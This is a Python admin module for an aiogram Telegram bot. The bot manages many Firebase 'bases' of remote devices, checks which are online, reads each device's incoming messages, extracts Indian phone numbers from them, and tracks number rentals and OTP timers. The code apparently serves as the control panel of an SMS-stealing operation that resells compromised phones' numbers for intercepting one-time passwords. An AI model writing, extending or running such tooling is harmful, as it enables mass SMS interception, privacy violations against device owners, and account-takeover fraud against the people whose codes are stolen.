from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.filters import Command
import time, asyncio, logging, aiohttp
import database as db
import firebase_utils as fbu
from utils.ui import sc, btn
from utils.helper import is_admin, get_countries, get_servers_grouped, get_ist_time_str
from states import S

log = logging.getLogger("Admin")
admin_router = Router()

# 🚨 REAL ONLINE STATS FIX: Direct status check
async def get_online_stats(firebases):
    total_online = 0
    total_devices = 0
    
    async def check_fb(fb):
        try:
            url = f"{fb['url']}/clients.json"
            if fb.get("auth"): url += f"&auth={fb['auth']}" if "?" in url else f"?auth={fb['auth']}"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=15) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data and isinstance(data, dict):
                            online = 0
                            for dev in data.values():
                                if isinstance(dev, dict) and dev.get("status") is True:
                                    online += 1
                            return online, len(data)
        except Exception: pass
        return 0, 0

    # Chunking logic to avoid timeout
    for i in range(0, len(firebases), 5):
        chunk = firebases[i:i+5]
        tasks = [check_fb(fb) for fb in chunk]
        results = await asyncio.gather(*tasks)
        for online, total in results:
            total_online += online
            total_devices += total
            
    return total_online, total_devices

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("enter as user", "user:main_menu", "👤"), btn("manage servers", "admin:manage_fb", "🔥")],
        [btn("track device", "admin:track_device", "🔍"), btn("manage vips", "admin:vip", "⭐")],
        [btn("active timers", "admin:active_timers", "📅")],
        [btn("refresh panel", "admin:home", "🔄")]
    ])

async def admin_home_msg(msg: Message):
    d = db.load_data()
    fbs = d.get("firebases", [])
    countries = get_countries(d)
    users_count = len(d.get("users", {}))
    total_servers = sum(len(get_servers_grouped(d, c)) for c in countries)
    
    status_msg = await msg.answer("🔄 Fetching live stats...")
    online_cnt, total_lines = await get_online_stats(fbs)
    
    text = (
        f"👑 <b>{sc('admin dashboard')}</b>\n\n"
        f"🌍 {sc('countries')}: <b>{len(countries)}</b>\n"
        f"🔥 {sc('total servers')}: <b>{total_servers}</b>\n"
        f"🗂 {sc('total bases')}: <b>{len(fbs)}</b>\n"
        f"📱 {sc('online lines')}: <b>{online_cnt}</b> / {total_lines}\n"
        f"👥 {sc('total users')}: <b>{users_count}</b>\n\n"
        f"<i>{sc('select an option below to manage the bot')}</i>"
    )
    try: 
        await status_msg.delete()
        await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except: pass

@admin_router.message(Command("admin"))
async def admin_panel_cmd(msg: Message):
    if not is_admin(msg.from_user.id): return
    await admin_home_msg(msg)

@admin_router.callback_query(F.data == "admin:home")
async def admin_home(cq: CallbackQuery):
    await cq.answer()
    if not is_admin(cq.from_user.id): return
    await admin_home_msg(cq.message)

@admin_router.callback_query(F.data == "admin:active_timers")
async def admin_active_timers(cq: CallbackQuery):
    await cq.answer()
    d = db.load_data()
    timers = d.get("upcoming_timers", {})
    text = "📅 <b>Active OTP Timers</b>\n\n"
    if not timers:
        text += "Koi active timer nahi hai."
    else:
        for key, t in timers.items():
            if time.time() < t["target_time"]:
                text += f"👤 User: <code>{t['user_id']}</code>\n🆔 <code>{t['rent_id']}</code>\n📞 <code>{t['number']}</code>\n⏰ {get_ist_time_str(t['target_time'])}\n\n"
    
    await cq.message.edit_text(
        text, 
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:home", "🔙")]]), 
        parse_mode="HTML"
    )

@admin_router.callback_query(F.data == "admin:vip")
async def admin_vip(cq: CallbackQuery):
    await cq.answer()
    d = db.load_data()
    vips = d.get("vip_users", [])
    text = f"⭐ <b>Manage VIPs</b>\n\nTotal VIPs: {len(vips)}\n\nUse <code>/addvip &lt;id&gt;</code> to add a new VIP."
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:home", "🔙")]]), parse_mode="HTML")

@admin_router.callback_query(F.data == "admin:track_device")
async def admin_track_device(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.track_query)
    await cq.message.edit_text("🔍 <b>Device Tracker</b>\n\nSend Rent ID, Mobile Number, or Base URL:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:home", "❌")]]), parse_mode="HTML")

@admin_router.message(S.track_query)
async def admin_track_device_done(msg: Message, state: FSMContext):
    await state.clear()
    query = msg.text.strip().lower()
    status = await msg.answer(f"🔄 Searching for <code>{query}</code>...", parse_mode="HTML")
    d = db.load_data()
    found = []
    
    async def check_fb(fb):
        if query in fb['url'].lower():
            clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
            if clients and isinstance(clients, dict):
                for dev_id, c in clients.items(): found.append((fb, dev_id, c))
            return
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if not clients or not isinstance(clients, dict): return
        for dev_id, c in clients.items():
            if query in dev_id.lower() or (isinstance(c, dict) and query in str(c).lower()):
                found.append((fb, dev_id, c))
                
    tasks = [check_fb(fb) for fb in d.get("firebases", [])]
    await asyncio.gather(*tasks)
    
    if not found: return await status.edit_text(f"❌ No device found for <code>{query}</code>.", parse_mode="HTML")
    text = f"🔍 <b>Result ({len(found)}):</b>\n\n"
    for fb, dev_id, c in found[:10]:
        stat = "🟢" if c.get("status") is True else "🔴"
        text += f"{stat} 🆔 <code>{dev_id}</code>\n🔗 <code>{fb['url']}</code>\n\n"
    await status.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:home", "🔙")]]), parse_mode="HTML")

@admin_router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    await cq.answer()
    if not is_admin(cq.from_user.id): return
    d = db.load_data()
    countries = get_countries(d)
    kb = [[btn(c, f"admin:country:{c}", "🌍")] for c in countries]
    kb.append([btn("add country", "admin:add_country", "➕"), btn("dead filter", "admin:dead_filter", "☠️")])
    kb.append([btn("add bulk urls", "admin:add_bulk", "➕")])
    kb.append([btn("back", "admin:home", "🔙")])
    try: await cq.message.edit_text(f"🔥 <b>{sc('manage servers')}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except: pass

@admin_router.callback_query(F.data.startswith("admin:country:"))
async def admin_country(cq: CallbackQuery):
    await cq.answer()
    country = cq.data.split(":")[2]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if not servers: return await cq.message.edit_text(f"❌ No servers in {country}.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:manage_fb", "🔙")]]), parse_mode="HTML")
    async def get_ping(srv):
        try: return await fbu.check_ping(srv[0]["url"], srv[0].get("auth"))
        except: return "❌ Timeout"
    pings = await asyncio.gather(*[get_ping(srv) for srv in servers])
    kb = []
    for i, (srv, ping) in enumerate(zip(servers, pings)):
        kb.append([btn(f"server {i+1} ({ping})", f"admin:server:{country}:{i}", "📁")])
    kb.append([btn("back", "admin:manage_fb", "🔙")])
    await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:server:"))
async def admin_server(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, idx = parts[2], int(parts[3])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if idx >= len(servers): return
    srv = servers[idx]
    try: await cq.message.edit_text("🔄 Fetching online counts...")
    except: pass
    async def get_counts(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        online = sum(1 for c in clients.values() if isinstance(c, dict) and c.get("status") is True) if clients else 0
        total = len(clients) if clients else 0
        return online, total
    counts = await asyncio.gather(*[get_counts(fb) for fb in srv])
    text = f"📁 <b>Server {idx+1} Bases:</b>\n\n"
    kb = []
    for i, (online, total) in enumerate(counts):
        url = srv[i]['url']
        text += f"🔹 <b>Base {i+1}:</b> {online} ON / {total} Total\n🔗 <code>{url}</code>\n\n"
        kb.append([btn(f"open base {i+1}", f"admin:base:{country}:{idx}:{i}", "🗂")])
    kb.append([btn("remove base", f"admin:rmmenu:{country}:{idx}", "🗑")])
    kb.append([btn("back", f"admin:country:{country}", "🔙")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:base:"))
async def admin_base(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, srv_idx, base_idx = parts[2], int(parts[3]), int(parts[4])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    fb = servers[srv_idx][base_idx]
    try: await cq.message.edit_text("🔄 Fetching devices...")
    except: pass
    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    kb = []
    if clients and isinstance(clients, dict):
        for dev_id, c in clients.items():
            if isinstance(c, dict):
                status_icon = "🟢" if c.get("status") is True else "🔴"
                kb.append([btn(f"{status_icon} device {dev_id[:10]}", f"admin:dev:{country}:{srv_idx}:{base_idx}:{dev_id}", "📱")])
    kb.append([btn("back", f"admin:server:{country}:{srv_idx}", "🔙")])
    if len(kb) == 1: return await cq.message.edit_text("❌ No devices found in this base.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await cq.message.edit_text(f"Base {base_idx+1} - All Devices:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:dev:"))
async def admin_device(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, srv_idx, base_idx, dev_id = parts[2], int(parts[3]), int(parts[4]), parts[5]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    fb = servers[srv_idx][base_idx]
    try: await cq.message.edit_text("🔄 Fetching numbers...")
    except: pass
    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=100", fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    best_nums = fbu.extract_best_numbers({}, msgs)
    text = f"📱 <b>Device Info</b>\n🆔 <code>{dev_id}</code>\n🔗 <code>{fb['url']}</code>\n\n<b>Numbers:</b>\n"
    if not best_nums: text += "No numbers found."
    for n, c in best_nums: text += f"📞 +91{n} (Conf: {c}%)\n"
    d.setdefault("device_numbers", {})[dev_id] = {"numbers": [n for n,c in best_nums], "base": f"Base {base_idx+1}", "srv": f"Server {srv_idx+1}"}
    db.save_data(d)
    kb = [[btn("back", f"admin:base:{country}:{srv_idx}:{base_idx}", "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@admin_router.callback_query(F.data.startswith("admin:rmmenu:"))
async def admin_rmmenu(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, srv_idx = parts[2], int(parts[3])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    srv = servers[srv_idx]
    kb = [[btn(f"delete base {i+1}", f"admin:rmdo:{country}:{srv_idx}:{i}", "🗑")] for i in range(len(srv))]
    kb.append([btn("cancel", f"admin:server:{country}:{srv_idx}", "❌")])
    await cq.message.edit_text("Select Base to delete:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@admin_router.callback_query(F.data.startswith("admin:rmdo:"))
async def admin_rmdo(cq: CallbackQuery):
    await cq.answer("✅ Removed!")
    parts = cq.data.split(":")
    country, srv_idx, base_idx = parts[2], int(parts[3]), int(parts[4])
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    fb_to_rm = servers[srv_idx][base_idx]
    d["firebases"] = [f for f in d["firebases"] if f["url"] != fb_to_rm["url"]]
    curr = 1
    for f in d["firebases"]:
        if f.get("country") == country:
            f["label"] = f"Base {curr}"
            curr += 1
    db.save_data(d)
    await admin_manage_fb(cq)

@admin_router.callback_query(F.data == "admin:add_country")
async def admin_add_country(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.add_country)
    await cq.message.edit_text("Enter Country Name:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:manage_fb", "❌")]]), parse_mode="HTML")

@admin_router.message(S.add_country)
async def admin_add_country_done(msg: Message, state: FSMContext):
    await state.clear()
    country = msg.text.strip().title()
    d = db.load_data()
    if country not in get_countries(d):
        d.setdefault("custom_countries", []).append(country)
        db.save_data(d)
    await msg.answer(f"✅ {country} added!", reply_markup=admin_kb())

@admin_router.callback_query(F.data == "admin:dead_filter")
async def admin_dead_filter(cq: CallbackQuery):
    await cq.answer()
    await cq.message.edit_text("🔄 Checking...")
    d = db.load_data()
    dead = []
    for i, fb in enumerate(d.get("firebases", [])):
        ping = await fbu.check_ping(fb["url"], fb.get("auth"))
        if "Timeout" in ping: dead.append((i, fb))
    if not dead: return await cq.message.edit_text("✅ No dead bases!", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "admin:manage_fb", "🔙")]]))
    kb = [[btn(f"🗑 {fb.get('label', 'Base')}", f"admin:rmdo_global:{i}")] for i, fb in dead]
    kb.append([btn("back", "admin:manage_fb", "🔙")])
    await cq.message.edit_text(f"☠️ Found {len(dead)} dead bases:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@admin_router.callback_query(F.data.startswith("admin:rmdo_global:"))
async def admin_rmdo_global(cq: CallbackQuery):
    await cq.answer("✅ Removed!")
    idx = int(cq.data.split(":")[2])
    d = db.load_data()
    if 0 <= idx < len(d["firebases"]):
        del d["firebases"][idx]
        db.save_data(d)
    await admin_manage_fb(cq)

@admin_router.callback_query(F.data == "admin:add_bulk")
async def admin_bulk_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.add_bulk_urls)
    await cq.message.edit_text("Send URLs (<code>URL</code> or <code>URL | Auth</code> or <code>URL | Auth | Secret</code>):", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "admin:manage_fb", "❌")]]), parse_mode="HTML")

@admin_router.message(S.add_bulk_urls)
async def admin_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    d = db.load_data()
    added = 0
    country = "India"
    for line in msg.text.strip().split("\n"):
        if not line.strip(): continue
        parts = [p.strip() for p in line.split("|")]
        url = parts[0]
        auth_key = parts[1] if len(parts) > 1 else ""
        is_secret = True if len(parts) > 2 and parts[2].lower() == "secret" else False
        if "#DARKs=" in url or "?s=" in url:
            dec = fbu.decode_panel_url(url)
            if dec: url = dec[0]
        if url.startswith("http"):
            d["firebases"].append({"url": url, "label": "Base ?", "country": country, "auth": auth_key, "secret": is_secret})
            added += 1
    curr = 1
    for f in d["firebases"]:
        if f.get("country") == country:
            f["label"] = f"Base {curr}"
            curr += 1
    db.save_data(d)
    await msg.answer(f"✅ {added} Bases added!", reply_markup=admin_kb())
